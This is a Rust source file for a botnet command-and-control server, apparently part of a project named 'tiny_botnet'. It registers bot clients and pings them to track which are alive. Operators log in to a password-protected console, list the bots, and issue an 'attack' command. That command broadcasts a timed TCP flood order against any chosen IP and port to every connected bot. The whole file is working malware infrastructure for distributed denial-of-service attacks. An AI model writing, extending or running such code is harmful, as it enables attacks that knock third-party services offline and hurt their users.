use std::{
    collections::HashMap,
    net::{IpAddr, Ipv4Addr, SocketAddrV4},
    str::from_utf8,
    sync::Arc,
    time::{Duration, Instant},
};

use anyhow::{anyhow, Result};

use smol::{
    io::{self, AsyncBufReadExt, AsyncReadExt, AsyncWriteExt},
    lock::Mutex,
    net::{TcpListener, TcpStream},
    stream::StreamExt,
    Timer,
};
use tiny_botnet::{Messages, TcpFloodPacket};
#[derive(Debug)]
struct Client {
    pub ip: Ipv4Addr,
    pub uuid: String,
    pub socket: TcpStream,
    pub last_ping: Instant,
}
struct ServerCtx {
    pub clients: HashMap<Ipv4Addr, Client>,
    pub controllers: Vec<TcpStream>,
}
const PASSWORD: &str = env!("PASSWORD");
const SERVER_LISTENER_ADDR: &str = env!("SERVER_LISTENER_ADDR");
const SERVER_CONTROLLER_LISTENER_ADDR: &str = env!("SERVER_CONTROLLER_LISTENER_ADDR");
async fn start_control(listener: TcpListener, ctx: Arc<Mutex<ServerCtx>>) -> Result<()> {
    let mut incoming = listener.incoming();

    while let Some(stream) = incoming.next().await {
        let stream = stream?;
        {
            let mut guard = ctx.lock().await;
            guard.controllers.push(stream.clone());
        }
        let ctx2 = ctx.clone();
        smol::spawn(async move {
            println!("controller connected, spawning thread");
            if let None = control_routine(ctx2, stream).await.ok() {
                println!("controller disconnected");
            }
        })
        .detach();
    }
    Ok(())
}
async fn start_clients(listener: TcpListener, ctx: Arc<Mutex<ServerCtx>>) -> Result<()> {
    let mut incoming = listener.incoming();

    while let Some(stream) = incoming.next().await {
        let stream = stream?;
        let ctx = ctx.clone();

        smol::spawn(async move {
            println!("client connected, spawning thread");
            handle_client(stream, ctx).await.ok();
            println!("client disconnected");
        })
        .detach();
    }
    Ok(())
}

fn main() -> Result<()> {
    smol::block_on(async {
        let listener = TcpListener::bind(SERVER_LISTENER_ADDR).await?;
        let control_listener = TcpListener::bind(SERVER_CONTROLLER_LISTENER_ADDR).await?;

        let server_ctx = Arc::new(Mutex::new(ServerCtx {
            clients: HashMap::new(),
            controllers: Vec::new(),
        }));
        let server_ctx2 = server_ctx.clone();
        smol::spawn(async move { start_control(control_listener, server_ctx2).await.ok() })
            .detach();

        let server_ctx2 = server_ctx.clone();
        smol::spawn(async move { server_routine(server_ctx2).await.ok() }).detach();
        smol::spawn(async move { start_clients(listener, server_ctx).await.ok() }).detach();
        loop {}

        Ok(())
    })
}
async fn server_routine(ctx: Arc<Mutex<ServerCtx>>) -> Result<()> {
    smol::spawn(async move {
        loop {
            let buf = bitcode::encode(&Messages::ServerPing(rand::random::<u16>())).unwrap();
            broadcast(&ctx, &buf).await.unwrap();

            Timer::after(Duration::from_secs(5)).await;
        }
    })
    .detach();

    Ok(())
}
async fn control_routine(ctx: Arc<Mutex<ServerCtx>>, mut client: TcpStream) -> Result<()> {
    let mut lines = io::BufReader::new(client.clone()).lines();

    client.write(b"PASS: ").await?;
    let pass = lines.next().await.ok_or(anyhow!("couldnt get login"))??;

    if pass != PASSWORD {
        client.write(b"\nINVALID PASSWORD\n").await?;
        client.close().await?;
        return Err(anyhow!("invalid login"));
    }
    let banner = r#"
  _   _                   _           _              _   
 | |_(_)_ __  _   _      | |__   ___ | |_ _ __   ___| |_ 
 | __| | '_ \| | | |_____| '_ \ / _ \| __| '_ \ / _ \ __|
 | |_| | | | | |_| |_____| |_) | (_) | |_| | | |  __/ |_ 
  \__|_|_| |_|\__, |     |_.__/ \___/ \__|_| |_|\___|\__|
              |___/                                      "#;
    client.write(banner.as_bytes()).await?;
    client.write(b"\n").await?;
    client
        .write(format!("{} client(s) online!", ctx.lock().await.clients.len()).as_bytes())
        .await?;
    client.write(b"\n").await?;
    client.write(b"-> ").await?;

    while let Some(line) = lines.next().await {
        let line = line?;

        if line.is_empty() {
            continue;
        }
        if let Err(e) = handle_control_command(line.clone(), ctx.clone(), client.clone()).await {
            client.write(b"invalid command and/or arguments\n").await?;
        }
        client.write(b"-> ").await?;
    }
    Ok(())
}
async fn handle_client(mut client: TcpStream, ctx: Arc<Mutex<ServerCtx>>) -> Result<()> {
    let mut buf = vec![0u8; 1024];

    while let Ok(read) = client.read(&mut buf).await {
        if read == 0 {
            break;
        }
        let received_data = &buf[..read];

        if let Ok(pkt) = bitcode::decode::<Messages>(received_data) {
            println!("Received packet: {:?}", pkt);
            handle_packet(pkt, &client, ctx.clone()).await?;
        } else {
            if let Ok(str_buf) = from_utf8(received_data) {
                println!("Received non packet data: {}", str_buf.trim_end());
            } else {
                println!("Received non packet non utf8 data: {:?}", received_data);
            }
        }
    }
    Ok(())
}
async fn broadcast(ctx: &Mutex<ServerCtx>, buf: &[u8]) -> Result<()> {
    let mut guard = ctx.lock().await;
    for (_, client) in guard.clients.iter_mut() {
        if let Err(e) = client.socket.write(&buf).await {
            continue;
        }
    }
    Ok(())
}
async fn handle_packet(
    packet: Messages,
    socket: &TcpStream,
    ctx: Arc<Mutex<ServerCtx>>,
) -> Result<()> {
    let IpAddr::V4(ipv4) = socket.peer_addr()?.ip() else {
        panic!("wut!");
    };

    match packet {
        Messages::ClientInit(pkt) => {
            let mut guard = ctx.lock().await;

            guard.clients.insert(
                ipv4,
                Client {
                    ip: pkt.ip.parse()?,
                    uuid: pkt.uuid,
                    socket: socket.to_owned(),
                    last_ping: Instant::now(),
                },
            );
        }

        Messages::ClientPong(_) => {
            let mut guard = ctx.lock().await;
            guard
                .clients
                .get_mut(&ipv4)
                .ok_or(anyhow!("couldnt get pinging client from ctx"))?
                .last_ping = Instant::now();
        }
        _ => {}
    }
    Ok(())
}
async fn handle_control_command(
    command: String,
    ctx: Arc<Mutex<ServerCtx>>,
    mut controller: TcpStream,
) -> Result<()> {
    let mut split = command.trim().split_ascii_whitespace();
    let command = split.next();
    let args: Vec<&str> = split.collect();

    match command {
        Some("ls") => {
            let guard = ctx.lock().await;
            let mut msg = String::new();
            guard.clients.iter().for_each(|(_, client)| {
                msg.push_str(&format!(
                    "ip: {} uuid: {} last_ping: {} secs ago\n",
                    client.ip.to_string(),
                    client.uuid,
                    &client.last_ping.elapsed().as_secs()
                ));
            });
            controller.write(msg.as_bytes()).await?;
        }
        Some("attack") if args.len() == 2 => {
            let ip: SocketAddrV4 = args[0].parse()?;
            let length = Duration::from_secs(args[1].parse()?);
            broadcast(
                &ctx,
                &Messages::new_packet(Messages::TcpfFlood(TcpFloodPacket {
                    ip: *ip.ip(),
                    port: ip.port(),
                    time: length,
                }))?,
            )
            .await?;
        }
        Some("help") => {
            controller.write(b"Command list:\n").await?;
            controller
                .write(b"ls                           - Lists connected clients\n")
                .await?;
            controller
                .write(
                    b"attack <ip:port> <seconds>   - Starts a TCP Flood attack from all clients\n",
                )
                .await?;
        }
        Some(_) => return Err(anyhow!("invalid command")),
        None => return Err(anyhow!("invalid command")),
    }
    Ok(())
}
